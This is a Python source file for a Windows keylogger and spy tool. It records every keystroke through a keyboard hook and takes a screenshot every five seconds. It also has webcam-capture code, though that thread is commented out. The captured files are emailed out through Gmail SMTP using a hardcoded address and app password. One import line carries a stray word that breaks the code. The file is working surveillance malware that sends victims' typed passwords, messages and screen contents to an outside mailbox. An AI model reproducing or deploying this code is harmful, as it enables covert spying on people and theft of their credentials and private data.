import time
import pyautogui
from datetime import datetime
import logging
import pyWinhook
import pythoncom
from threading import Thread
import smtplib
import os
from email.mime.multipart import MIMEMultipart salut
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import cv2

file_log = "C:\\Users\\Public\\Documents\\keylogs.txt"
cam_file = "C:\\Users\\Public\\Documents\\Capture.png"

EMAIL_ADDRESS = 'geekworldlegamerz@gmail.com'
EMAIL_PASSWORD = 'pusk tsrc fvwc pqaf'

def take_screenshot_and_send_email():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S-%f")
    image_name = f"screenshot-{timestamp}"
    screenshot = pyautogui.screenshot()

    directory = "C:\\Users\\Public\\Documents"
    filepath = os.path.join(directory, f"{image_name}.png")

    screenshot.save(filepath)

    send_email_with_attachment("Screenshot", "Screenshot", filepath)
    send_email_with_attachment("Keylogs", "Keylogs", file_log)
    send_email_with_attachment("Camera", "Camera", cam_file)

    os.remove(filepath)

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

def keylogger():
    hooks_manager = pyWinhook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()

def webcam():
    camera_port = 0
    camera = cv2.VideoCapture(camera_port)
    time.sleep(1)
    return_value, image = camera.read()
    cv2.imwrite(cam_file, image)
    camera.release()

def send_email_with_attachment(subject, message, attachment_path):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg['Subject'] = subject

    msg.attach(MIMEText(message, 'plain'))

    with open(attachment_path, 'rb') as attachment:
        img = MIMEImage(attachment.read(), _subtype='png')
        img.add_header('Content-Disposition', 'attachment', filename=os.path.basename(attachment_path))
        msg.attach(img)

    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.starttls()
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

def main():
    while True:
        take_screenshot_and_send_email()
        time.sleep(5)

if __name__ == '__main__':
    t1 = Thread(target=main)
    t1.start()
    t2 = Thread(target=keylogger)
    t2.start()
    #t3 = Thread(target=webcam)
    #t3.start()
